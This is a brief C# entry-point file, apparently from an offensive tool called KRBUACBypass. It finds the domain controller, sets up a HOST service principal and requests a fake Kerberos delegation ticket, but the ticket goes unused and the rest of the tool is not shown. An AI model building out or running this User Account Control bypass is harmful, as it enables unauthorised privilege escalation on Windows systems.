using System;
using System.Net;
using KRBUACBypass.lib.Interop;

namespace KRBUACBypass
{
    internal class Program
    {
        public static bool wrapTickets = false;
        public static bool Verbose = true;

        static void Main(string[] args)
        {
            Run();
        }

        private static void Run()
        {
            string domainController = Networking.GetDCName();
            string service = $"HOST/{Dns.GetHostName()}";
            Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;

            byte[] blah = LSA.RequestFakeDelegTicket();
        }
    }
}
